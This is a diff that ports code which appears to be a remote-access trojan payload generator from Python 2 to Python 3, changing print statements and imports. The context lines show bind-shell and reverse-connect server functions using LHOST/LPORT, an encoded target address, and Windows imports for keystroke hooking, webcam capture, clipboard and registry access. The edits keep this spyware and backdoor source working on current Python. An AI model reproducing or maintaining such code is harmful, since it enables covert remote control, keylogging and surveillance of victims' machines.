@@ -1,5 +1,5 @@
 import sys
-from st_aes import *
+from .st_aes import *
 from random import randint,choice
 from string import ascii_uppercase
 
@@ -26,7 +26,7 @@ def add_bind_server(BHOST,BPORT):
         self.stop_bind_server = False
         # if no target is defined, we listen on all interfaces
         if dbg:
-            print 'creating server'
+            print('creating server')
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         target = base64.b64decode("{}")
@@ -71,7 +71,7 @@ def add_listen_server(LHOST,LPORT):
                 sleep(5)
                 pass
             if dbg:
-                print 'trying to connect'
+                print('trying to connect')
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             client_socket.settimeout(5)
@@ -135,7 +135,7 @@ def main():
             pass
         except Exception as e:
             if dbg:
-                print e
+                print(e)
             pass
         st_pyld.halt_listen_server()
 
@@ -156,7 +156,7 @@ def main():
             pass
         except Exception as e:
             if dbg:
-                print e
+                print(e)
             pass
         st_pyld.halt_bind_server()
 
@@ -409,7 +409,7 @@ def win_reg_exists():
     return '''
 def reg_exists(path):
     try:
-        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,path)
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
         return True
     except:
         return False\n\n
@@ -419,7 +419,7 @@ def win_util_imports():
     return '''
 import vidcap
 import pyHook
-import _winreg
+import winreg
 import pythoncom
 from ctypes import *
 import win32clipboard
@@ -1036,13 +1036,13 @@ import struct
 import zipfile
 import datetime
 import requests
-import StringIO
+from io import StringIO
 import platform
 import threading
 import subprocess
 from Crypto import Random
 from Crypto.Cipher import AES
-from mss import ScreenshotError
+from mss.exception import ScreenshotError
 from time import strftime, sleep
 from contextlib import contextmanager
 from base64 import b64decode as INFO
